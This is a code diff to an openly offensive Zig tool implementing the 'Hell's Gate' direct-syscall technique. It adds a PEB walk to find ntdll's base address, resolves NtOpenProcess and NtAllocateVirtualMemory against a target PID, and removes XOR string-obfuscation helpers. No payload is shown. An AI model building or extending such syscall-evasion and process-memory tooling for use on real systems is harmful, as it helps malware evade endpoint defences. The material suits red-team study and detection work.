@@ -1,12 +1,11 @@
 // Zig Hell's Gate implementation - Direct syscall
-// This implementation is based on the original Rust implementation by 0xflux and C code by VX-UNDERGROUND
+// This implementation is based on the original Rust implementation by ___ and C code by VX-UNDERGROUND
 // Author : @zux0x3a
 // https://github.com/0xsp-SRD/zig_offsec/Hells_Gate/
 
 const std = @import("std");
 const os = std.os;
 const win32 = os.windows;
-//const PR = std.debug;
 
 const IMAGE_NT_HEADERS64 = extern struct {
     signature: u32,
@@ -240,8 +239,40 @@ pub fn get_module_base(module_name: []const u8) ?*anyopaque {
     return null;
 }
 
+pub fn get_ntdll_base(module_name: []const u8) ?*anyopaque {
+    const peb = win32.peb();
+    var list_entry = peb.Ldr.InMemoryOrderModuleList.Flink;
+
+    while (true) {
+        const module: *const win32.LDR_DATA_TABLE_ENTRY = @fieldParentPtr("InMemoryOrderLinks", list_entry);
+
+        if (module.BaseDllName.Buffer) |buffer| {
+            var dll_name: [256]u8 = undefined;
+            var i: usize = 0;
+
+            while (i < module.BaseDllName.Length / @sizeOf(win32.WCHAR) and i < 255) {
+                dll_name[i] = @truncate(buffer[i]);
+                i += 1;
+            }
+
+            dll_name[i] = 0;
+
+            if (std.ascii.eqlIgnoreCase(dll_name[0..i], module_name)) {
+                return module.DllBase;
+            }
+        }
+
+        list_entry = list_entry.Flink;
+
+        if (list_entry == &peb.Ldr.InMemoryOrderModuleList) break;
+    }
+
+    return null;
+}
 pub fn get_function_address_from_export(dll_name: []const u8, function_name: []const u8) ?*anyopaque {
-    const dll_base = get_module_base((dll_name));
+    // const dll_base = get_module_base((dll_name));   // if you want the RAW inline_ASM version.
+    const dll_base = get_ntdll_base(dll_name);
+
     const base_addr = @intFromPtr(dll_base);
     std.debug.print("[DEBUG] DLL base for {s}: 0x{x}\n", .{ dll_name, base_addr });
 
@@ -303,7 +334,7 @@ pub fn get_function_address_from_export(dll_name: []const u8, function_name: []c
         std.debug.print("[-] Null export array pointer\n", .{});
         return null;
     }
-    //search for the function name
+
     // for i in 0..number_of_names
     std.debug.print("[+] Export directory: {}\n", .{export_dir.number_of_names});
     for (0..export_dir.number_of_names) |i| {
@@ -397,25 +428,7 @@ pub fn nt_allocate_virtual_memory(
           [protect] "{rsp+0x30}" (protect),
         : .{ .r10 = true, .memory = true });
 }
-fn encrypt_string(comptime str: []const u8, key: u8) []const u8 {
-    var encrypted: [str.len]u8 = undefined;
-    for (str, 0..) |char, i| {
-        encrypted[i] = char ^ key;
-    }
-    return &encrypted;
-}
 
-fn decrypt_string(allocator: std.mem.Allocator, encrypted: []const u8, key: u8) []u8 {
-    const decrypted = allocator.alloc(u8, encrypted.len) catch {
-        std.debug.print("[-] Failed to allocate memory for decrypted string\n", .{});
-        std.process.exit(1);
-    };
-
-    for (encrypted, 0..) |char, i| {
-        decrypted[i] = char ^ key;
-    }
-    return decrypted;
-}
 pub fn parse_args(allocator: std.mem.Allocator) u32 {
     var args = std.process.argsWithAllocator(allocator) catch {
         std.debug.print("[-] Failed to get command line arguments\n", .{});
@@ -458,7 +471,7 @@ pub fn main() void {
 
     // const pid = 9056;
     std.debug.print("[+] Target PID: {}\n", .{pid});
-    _ = waitForEnter() catch {};
+    _ = waitForEnter() catch {}; // remove if if you do not want to debug.
 
     const ntdll_str = "ntdll.dll";
     const nt_open_proc_str = "NtOpenProcess";
